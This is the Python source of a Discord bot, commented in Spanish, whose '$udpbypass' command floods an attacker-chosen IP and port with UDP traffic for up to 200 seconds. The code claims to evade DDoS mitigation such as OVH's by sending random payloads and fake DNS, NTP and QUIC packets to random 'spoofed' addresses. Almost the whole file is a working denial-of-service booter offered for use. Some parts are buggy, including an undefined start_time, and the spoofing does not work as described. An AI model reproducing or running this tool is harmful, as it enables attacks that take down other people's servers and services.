import discord
from discord.ext import commands
import socket
import random
import time
import threading
import asyncio
import struct
import ipaddress
from urllib.parse import urlparse

# Configuraci√≥n
TOKEN = 'TU_TOKEN_AQUI'  # ¬°Cambia esto!
PREFIX = '$'
authorized_users = ['TU_ID_DISCORD']  # Reemplaza con tu ID
cooldown_seconds = 60
max_attack_time = 200

# Variables globales
attack_in_progress = False
last_attack_time = 0
current_attack_stop_event = None

bot = commands.Bot(command_prefix=PREFIX, intents=discord.Intents.all())

### üî• M√âTODOS MEJORADOS (ANTI-MITIGACI√ìN) ###
def generate_legit_udp_packets(target_ip, target_port):
    """Genera tr√°fico UDP que parece leg√≠timo (DNS, NTP, QUIC)"""
    protocols = {
        'dns': (b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01', 53),
        'ntp': (b'\x1b' + 47 * b'\x00', 123),
        'quic': (b'\x0d\x00\x00\x00\x00\x00\x00\x00\x00', 443)
    }
    
    protocol = random.choice(list(protocols.values()))
    payload, port = protocol
    
    # Spoofing de IP aleatoria
    src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    
    return payload, port, src_ip

async def udp_bypass_attack(target_ip, target_port, duration):
    """Ataque UDP mejorado para bypassear OVH/SAS"""
    sockets = []
    for _ in range(200):  # Sockets m√∫ltiples
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2097152)
            sockets.append(s)
        except:
            continue

    start_time = time.time()
    sent_packets = 0

    while time.time() < start_time + duration:
        if current_attack_stop_event and current_attack_stop_event.is_set():
            break
            
        for s in sockets:
            try:
                # 1. Tr√°fico leg√≠timo (50%)
                if random.random() > 0.5:
                    payload, port, src_ip = generate_legit_udp_packets(target_ip, target_port)
                    s.sendto(payload, (src_ip, port))  # Spoofing a servidores reales
                
                # 2. Payloads aleatorios (50%)
                else:
                    payload = random._urandom(random.randint(512, 1450))
                    s.sendto(payload, (target_ip, target_port))
                
                sent_packets += 1
            except:
                continue
        
        await asyncio.sleep(0.001)

    # Limpieza
    for s in sockets:
        try:
            s.close()
        except:
            pass

    return sent_packets

### üéØ COMANDOS DEL BOT (ACTUALIZADOS) ###
@bot.command(name='udpbypass')
async def udp_bypass(ctx, ip: str, port: int, tiempo: int):
    if str(ctx.author.id) not in authorized_users:
        return await ctx.send("‚ùå **No autorizado**")
        
    global attack_in_progress, last_attack_time
    
    # Validaciones
    if attack_in_progress:
        return await ctx.send("‚ö†Ô∏è **Ataque en curso**")
    if time.time() - last_attack_time < cooldown_seconds:
        return await ctx.send(f"‚è≥ **Espera {cooldown_seconds - int(time.time() - last_attack_time)}s**")
    if tiempo > max_attack_time:
        return await ctx.send(f"‚ö†Ô∏è **M√°ximo {max_attack_time}s**")

    attack_in_progress = True
    embed = discord.Embed(
        title="üåÄ **UDP BYPASS INICIADO**",
        description=f"```\nIP: {ip}\nPuerto: {port}\nDuraci√≥n: {tiempo}s\n```",
        color=0x00ff00
    )
    msg = await ctx.send(embed=embed)

    try:
        sent_packets = await udp_bypass_attack(ip, port, tiempo)
        
        # Resultados
        elapsed = time.time() - start_time
        embed = discord.Embed(
            title="‚úÖ **UDP BYPASS COMPLETADO**",
            description=f"```diff\n+ IP: {ip}:{port}\n+ Paquetes: {sent_packets:,}\n+ PPS: {sent_packets/elapsed:,.0f}\n```",
            color=0x00ff00
        )
        await msg.edit(embed=embed)

    except Exception as e:
        await msg.edit(content=f"‚ùå **Error:** `{str(e)}`")
    finally:
        attack_in_progress = False
        last_attack_time = time.time()

### üõë COMANDO STOP ###
@bot.command(name='stop')
async def stop_attack(ctx):
    if str(ctx.author.id) not in authorized_users:
        return await ctx.send("‚ùå **No autorizado**")

    global current_attack_stop_event
    if current_attack_stop_event:
        current_attack_stop_event.set()
        await ctx.send("üõë **Ataque detenido**")
    else:
        await ctx.send("‚ö†Ô∏è **No hay ataques activos**")

bot.run(TOKEN)
